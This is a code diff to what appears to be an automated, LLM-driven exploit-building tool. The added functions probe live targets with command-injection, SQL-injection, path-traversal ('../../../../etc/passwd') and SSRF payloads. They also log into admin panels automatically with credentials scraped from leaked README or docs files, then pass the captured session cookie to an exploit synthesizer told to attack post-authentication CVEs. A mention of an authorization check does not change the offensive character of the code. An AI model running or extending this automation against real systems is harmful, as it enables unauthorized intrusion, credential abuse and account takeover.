@@ -15091,6 +15091,235 @@ def _deep_enum_framework(ip, port, framework, intel_list=None, timeout=3):
               "guessing at generic endpoints.")
 
 
+def _verify_strategist_plan(ip, port, plan_text, session_cookie=None, timeout=3):
+    """Detect strategist hallucinations by empirically probing every proposed
+    (endpoint, param, class) tuple BEFORE synth wastes iters on a made-up vector.
+    Three checks per candidate:
+      1. Endpoint exists — GET returns not-404 (or configured 200/301/302/401/403)
+      2. Param is honored — GET with `?<param>=canary` differs from baseline
+      3. Class-plausible — for RCE/SQLi/LFI, a class-specific canary probe returns
+         something other than the same page a bogus param would (length delta,
+         error signal, distinct status)
+    Every candidate gets a verdict: LIVE / SUSPECT / FAKE. FAKE entries are stripped
+    from the plan text handed to synth; SUSPECT entries stay with a warning; LIVE
+    entries are annotated as such. Fails soft: on any exception the plan is unchanged.
+    Returns (annotated_plan, {label: verdict})."""
+    if not plan_text or "PRIMARY:" not in plan_text:
+        return plan_text, {}
+    import httpx as _hx, re as _re
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    # Extract PRIMARY + ALTs from the plan text (regex over the compact string form).
+    candidates = []
+    for m in _re.finditer(
+        r"(PRIMARY|ALT\d):\s+class=(\S+)\s+endpoint=(\S+)\s+param=(\S+)",
+        plan_text,
+    ):
+        candidates.append({"label": m.group(1), "class": m.group(2),
+                           "endpoint": m.group(3), "param": m.group(4)})
+    if not candidates:
+        return plan_text, {}
+    hdrs = {}
+    if session_cookie:
+        hdrs["Cookie"] = session_cookie
+    # Get baseline of the endpoint (no param) so we can diff against a probe.
+    def _fetch(path, params=None):
+        try:
+            with _hx.Client(verify=False, follow_redirects=False, timeout=timeout,
+                             headers=hdrs) as cli:
+                r = cli.get(base + path, params=params or {})
+                return r.status_code, len(r.text or ""), (r.text or "")[:600]
+        except Exception:  # noqa: BLE001
+            return None, 0, ""
+    verdicts = {}
+    notes = []
+    for c in candidates:
+        endpoint = c["endpoint"]; param = c["param"]; cls = c["class"].upper()
+        # 1. Endpoint existence check
+        st, ln, body = _fetch(endpoint)
+        if st is None:
+            verdicts[c["label"]] = "FAKE"
+            notes.append(f"{c['label']} endpoint={endpoint} FAKE (network error)")
+            continue
+        if st == 404:
+            verdicts[c["label"]] = "FAKE"
+            notes.append(f"{c['label']} endpoint={endpoint} FAKE (404)")
+            continue
+        base_len = ln
+        # 2. Param-honored check — send a benign canary as the param value; if the
+        # response is byte-identical to baseline, the app ignores this param.
+        canary = "z3st4v"
+        st2, ln2, body2 = _fetch(endpoint, {param: canary})
+        if st2 is None:
+            verdicts[c["label"]] = "SUSPECT"
+            notes.append(f"{c['label']} param={param} SUSPECT (probe error)")
+            continue
+        param_honored = (st2 != st) or (abs(ln2 - base_len) > 10) or (canary in body2)
+        if not param_honored:
+            verdicts[c["label"]] = "FAKE"
+            notes.append(
+                f"{c['label']} endpoint={endpoint} exists but param `{param}` is IGNORED "
+                f"(baseline={base_len}, probed={ln2} — no delta)")
+            continue
+        # 3. Class-plausible check
+        class_probe = None
+        expect_signal = None
+        if "RCE" in cls or "COMMAND" in cls:
+            class_probe = f"{canary};echo INJx"; expect_signal = "INJx"
+        elif "SQLI" in cls or "SQL" in cls:
+            class_probe = f"{canary}'"; expect_signal = "sql|syntax|mysql|mariadb|sqlite|pg"
+        elif "LFI" in cls or "TRAVERSAL" in cls:
+            class_probe = "../../../../etc/passwd"; expect_signal = "root:x:|nobody:|www-data"
+        elif "SSRF" in cls:
+            class_probe = "http://127.0.0.1:1/"; expect_signal = None
+        if class_probe:
+            st3, ln3, body3 = _fetch(endpoint, {param: class_probe})
+            hit = False
+            if expect_signal:
+                if _re.search(expect_signal, body3, _re.I):
+                    hit = True
+            else:
+                # No canonical expected signal — accept any distinct response
+                if st3 != st or abs(ln3 - base_len) > 100:
+                    hit = True
+            if hit:
+                verdicts[c["label"]] = "LIVE"
+                notes.append(f"{c['label']} {cls} on {endpoint}?{param}= — LIVE "
+                             f"({class_probe!r} triggered class-specific signal)")
+            else:
+                verdicts[c["label"]] = "SUSPECT"
+                notes.append(
+                    f"{c['label']} {cls} on {endpoint}?{param}= — SUSPECT "
+                    f"(param honored but class-canary {class_probe!r} did not trigger "
+                    f"a {cls}-specific signal)")
+        else:
+            verdicts[c["label"]] = "LIVE"
+            notes.append(f"{c['label']} endpoint+param honored (class not probed)")
+    # Rewrite the plan text: strip FAKE, annotate SUSPECT/LIVE. Never strip everything
+    # (synth needs something to work on) — if all candidates went FAKE, keep them with
+    # a warning banner so synth knows recon didn't back the plan.
+    live_or_suspect = [c for c in candidates if verdicts.get(c["label"]) in ("LIVE", "SUSPECT")]
+    banner = ("PLAN VERIFICATION (empirically probed on THIS target — hallucinations "
+              "detected below):\n  " + "\n  ".join(notes) + "\n")
+    if not live_or_suspect:
+        return banner + "\n" + plan_text, verdicts
+    # For plan text, replace any FAKE PRIMARY with the highest-verdict ALT.
+    new_plan = plan_text
+    if verdicts.get("PRIMARY") == "FAKE":
+        # Find the first live ALT and promote it in the plan text
+        for c in candidates:
+            if c["label"] != "PRIMARY" and verdicts.get(c["label"]) == "LIVE":
+                # Swap the PRIMARY: block with the ALT block (best-effort in text)
+                new_plan = new_plan.replace(
+                    "PRIMARY:", f"PRIMARY-WAS-FAKE (endpoint={candidates[0]['endpoint']}) — PROMOTED-{c['label']} to PRIMARY:", 1)
+                break
+    return banner + "\n" + new_plan, verdicts
+
+
+def _try_mined_credentials(ip, port, credential_hints, admin_paths=None, timeout=4):
+    """When response mining extracted credentials from a README/docs, try to actually
+    log in with them. Iterates cred_hints × candidate admin login paths × common field-
+    name permutations. On a successful login, returns the session cookie + path so the
+    synth can build an authenticated PoC directly rather than assuming unauth. Trace as
+    recon:auto_login.
+    Success detection: (a) Set-Cookie with a non-empty session-like value AND redirect
+    or (b) response body contains "welcome" / "dashboard" / "logout" / "success"
+    without an "invalid" / "error" / "failed" marker."""
+    if not credential_hints:
+        return None
+    import httpx as _hx, re as _re
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    candidate_paths = list(dict.fromkeys(
+        (admin_paths or []) + [
+            "/admin/login.php", "/admin/index.php", "/admin/", "/admin",
+            "/login", "/login.php", "/wp-login.php", "/user/login",
+            "/manage/login", "/auth/login", "/administrator/index.php",
+        ]))[:8]
+    # Common field-name permutations for the login form
+    field_pairs = [
+        ("user", "pass"), ("username", "password"), ("user", "password"),
+        ("email", "password"), ("name", "pwd"), ("account", "password"),
+        ("login", "password"), ("user", "pwd"),
+    ]
+    success_words = ("welcome", "dashboard", "logout", "sign out", "退出",
+                     "control panel", "successfully", "profile", "settings",
+                     "后台管理", "管理面板")
+    fail_words = ("invalid", "incorrect", "failed", "error", "wrong",
+                   "验证码", "captcha", "验证失败", "denied", "unauthorized")
+    # First pass: prefilter candidate paths — must be REAL login pages (200/302, with
+    # form + password field), and skip captcha-guarded ones (no OCR here). Empty result
+    # returns a structured skip rather than a silent None so the caller can log why.
+    real_login_paths = []
+    captcha_paths = []
+    for path in candidate_paths:
+        try:
+            with _hx.Client(verify=False, follow_redirects=True, timeout=timeout) as cli:
+                r = cli.get(base + path)
+                if r.status_code >= 400:
+                    continue  # 404 / server error — not a real login page
+                body = (r.text or "")[:8000]
+                blow = body.lower()
+                # Must contain a password-ish input to be a login form
+                looks_like_login = _re.search(
+                    r'<input[^>]+type=["\']?password["\']?', body, _re.I) is not None
+                if not looks_like_login:
+                    continue
+                if any(k in blow for k in ("captcha", "authcode", "verify code",
+                                             "验证码", "vcode", "check_code")):
+                    captcha_paths.append(path)
+                    continue
+                real_login_paths.append(path)
+        except Exception:  # noqa: BLE001
+            continue
+    if not real_login_paths:
+        reason = ("no login form found on any candidate path" if not captcha_paths
+                   else "all candidate login pages require captcha")
+        return {"skipped": True, "reason": reason,
+                "captcha_paths": captcha_paths}
+    captcha_free_paths = real_login_paths  # rename for the loop below
+    for cred in credential_hints:
+        if ":" not in cred:
+            continue
+        username, password = cred.split(":", 1)
+        for path in captcha_free_paths:
+            for u_field, p_field in field_pairs:
+                try:
+                    with _hx.Client(verify=False, follow_redirects=False,
+                                     timeout=timeout) as cli:
+                        data = {u_field: username, p_field: password}
+                        r = cli.post(base + path, data=data)
+                        set_cookie = r.headers.get("set-cookie", "")
+                        body = (r.text or "")[:2000].lower()
+                        # A 302/303 to a non-login page + a Set-Cookie is the strongest signal
+                        location = r.headers.get("location", "").lower()
+                        redirected_off_login = (
+                            r.status_code in (301, 302, 303, 307)
+                            and location
+                            and "login" not in location
+                            and "err" not in location)
+                        has_session_cookie = bool(_re.search(
+                            r"(PHPSESSID|JSESSIONID|SESSIONID|session|token|auth|csrf)=[^;]{8,}",
+                            set_cookie, _re.I))
+                        body_success = (
+                            any(w in body for w in success_words)
+                            and not any(w in body for w in fail_words))
+                        if (redirected_off_login and has_session_cookie) or body_success:
+                            # Extract just the cookie name=value pairs
+                            cookies = _re.findall(r"([A-Za-z0-9_.-]+=[^;]+)", set_cookie)
+                            cookie_header = "; ".join(cookies) if cookies else set_cookie
+                            return {
+                                "path": path, "cred": cred,
+                                "u_field": u_field, "p_field": p_field,
+                                "cookie_header": cookie_header,
+                                "signal": ("redirect+cookie" if redirected_off_login
+                                            else "body-success-word"),
+                            }
+                except Exception:  # noqa: BLE001
+                    continue
+    return None
+
+
 def _characterize_waf(ip, port, family, timeout=4):
     """When a WAF is detected, PROBE it with real evasion variants to learn what
     actually gets through. This turns the generic playbook into empirical evidence:
@@ -15603,7 +15832,27 @@ def _build_poc_core(cve, ip, port, product, version, eid, max_iters=3, research=
     Python + Burp HTTP artifacts). Shared by the /software/build-poc endpoint AND the
     detection->exploit resolver's no-public-exploit fallback. `research=True` seeds the synth
     with real public-exploit material (what makes a PoC land vs a description-only guess).
-    Returns the result dict incl. exploit_store_id. Caller owns the authorization (grant) check."""
+    Returns the result dict incl. exploit_store_id. Caller owns the authorization (grant) check.
+
+    Rollout note: when BUILD_POC_LANGGRAPH=1 this dispatches to build_poc_graph.invoke_build_poc,
+    the StateGraph refactor. Currently that path returns a _langgraph_stub sentinel while the
+    nodes are being migrated stage-by-stage; on stub the wrapper falls back to the monolith so
+    no traffic is dropped. Flag defaults off — monolith is unchanged and load-bearing until
+    Stage 5 of the migration flips it on."""
+    try:
+        import build_poc_graph as _bpg
+        if _bpg.enabled():
+            _state = _bpg.initial_state(
+                cve, ip, port, product=product, version=version, eid=eid,
+                max_iters=max_iters, research=research, model=model, auth=auth,
+                recon_first=recon_first, recon_source=recon_source, hint=hint,
+            )
+            _r = _bpg.invoke_build_poc(_state)
+            if not _r.get("_langgraph_stub"):
+                return _r
+            # Stub -> fall through to monolith (Stage 1 default)
+    except Exception as _e:  # noqa: BLE001
+        logging.debug("build_poc_graph dispatch skipped: %s", _e)
     import time as _t
     _t0 = _t.time()
     run_id = f"{cve}_{ip}_{int(_t.time())}"
@@ -15696,6 +15945,61 @@ def _build_poc_core(cve, ip, port, product, version, eid, max_iters=3, research=
                 if mine_line:
                     segments.append(mine_line)
                     _poc_trace(run_id, "recon:response_mine", response=mine_line[:1500])
+                # Reactive credential-loop: if mining extracted admin:password style
+                # hints from a README/docs, TRY the login immediately. Success ->
+                # session cookie flows into auth_guidance for synth (authenticated PoC
+                # instead of unauth-guessing).
+                cred_hints = []
+                admin_paths_mined = []
+                for x in intel_list:
+                    cred_hints.extend(x.get("credential_hints", []) or [])
+                    admin_paths_mined.extend(x.get("admin_paths", []) or [])
+                cred_hints = list(dict.fromkeys(cred_hints))
+                admin_paths_mined = list(dict.fromkeys(admin_paths_mined))
+                if cred_hints:
+                    _t0 = _t.time()
+                    try:
+                        login = _try_mined_credentials(ip, port, cred_hints, admin_paths_mined)
+                    except Exception:  # noqa: BLE001
+                        login = None
+                    recon_metrics["auto_login"] = {
+                        "seconds": round(_t.time() - _t0, 2),
+                        "chars_added": 0,
+                        "signal": "auto-login attempt with mined credentials",
+                    }
+                    if login and login.get("cookie_header"):
+                        note = (f"AUTO-LOGIN SUCCESS with mined creds {login['cred']} at "
+                                f"{login['path']} (fields {login['u_field']}/"
+                                f"{login['p_field']}, signal={login['signal']}). "
+                                f"Session cookie: {login['cookie_header'][:200]}. "
+                                "Synth: send this Cookie header on every exploit request.")
+                        segments.append(note)
+                        _poc_trace(run_id, "recon:auto_login",
+                                   response=note[:1200],
+                                   extra={"path": login["path"],
+                                          "cred": login["cred"]})
+                        # Wire the cookie into auth so it reaches synth as auth_guidance
+                        if not auth:
+                            auth = {}
+                        auth.setdefault("_auto_cookie", login["cookie_header"])
+                        auth.setdefault("_auto_login_path", login["path"])
+                        recon_metrics["auto_login"]["chars_added"] = len(note)
+                    elif login and login.get("skipped"):
+                        note = (f"AUTO-LOGIN SKIPPED: {login['reason']}. "
+                                f"Captcha-guarded paths: {login.get('captcha_paths', [])}. "
+                                f"Mined credentials {cred_hints[:3]} available — operator "
+                                "should log in manually and add the session cookie as an "
+                                "operator hint, or seed a bypass technique.")
+                        segments.append(note)
+                        _poc_trace(run_id, "recon:auto_login",
+                                   response=note[:1200],
+                                   extra={"skipped": True,
+                                          "captcha_paths": login.get("captcha_paths")})
+                        recon_metrics["auto_login"]["chars_added"] = len(note)
+                    else:
+                        _poc_trace(run_id, "recon:auto_login",
+                                   response=f"tried {len(cred_hints)} cred(s) × "
+                                            "candidate paths — no working login")
                 # Reactive framework deep-enum
                 detected_frameworks = list(dict.fromkeys(
                     x.get("framework") for x in intel_list if x.get("framework")))
@@ -15763,6 +16067,15 @@ def _build_poc_core(cve, ip, port, product, version, eid, max_iters=3, research=
                                  f"{session_info.get('username')}). ")
         except Exception as e:  # noqa: BLE001
             logging.debug("build auth step failed: %s", e)
+    # Also honor the AUTO-LOGIN cookie that the credential-feedback loop captured
+    # from mined README/docs credentials. Feeds synth an authenticated context
+    # WITHOUT the operator having to supply creds.
+    if auth and auth.get("_auto_cookie") and not auth_guidance:
+        auth_guidance = (f"AUTH (auto-login from mined creds): send this cookie in EVERY "
+                         f"exploit request: Cookie: {auth['_auto_cookie']}. "
+                         f"Logged in at {auth.get('_auto_login_path', '?')} with credentials "
+                         "extracted from a leaked README/docs — the app is now "
+                         "AUTHENTICATED, target the admin backend for post-auth CVEs.")
     # Automatic reference-PoC research: feed concrete public-exploit material into synth.
     # Operator hints: highest-priority guidance. Inline `hint` (per-request) is prepended
     # FIRST, then persistent hints for this (cve, ip, port), then recon + auth. Hints are
@@ -15823,6 +16136,20 @@ def _build_poc_core(cve, ip, port, product, version, eid, max_iters=3, research=
         logging.debug("recon strategist skipped: %s", e)
         strategy = ""
     if strategy:
+        # Hallucination check: empirically probe each proposed (endpoint, param, class)
+        # tuple in the plan and reject/demote fakes BEFORE synth gets them. LLM often
+        # invents endpoints from framework-routing knowledge; verify against live target.
+        try:
+            _auto_cookie = (auth or {}).get("_auto_cookie")
+            strategy_verified, verdicts = _verify_strategist_plan(
+                ip, port, strategy, session_cookie=_auto_cookie)
+            if verdicts:
+                _poc_trace(run_id, "recon:plan_verified",
+                           response=f"verdicts: {verdicts}",
+                           extra={"verdicts": verdicts})
+                strategy = strategy_verified
+        except Exception as e:  # noqa: BLE001
+            logging.debug("plan verification skipped: %s", e)
         # Strategist plan wins prominence: prepend to guidance, ahead of everything else.
         guidance = strategy + " " + guidance
     built = _synthesize_cve_poc(cve, ip, port, product, version, eid, run_id=run_id,
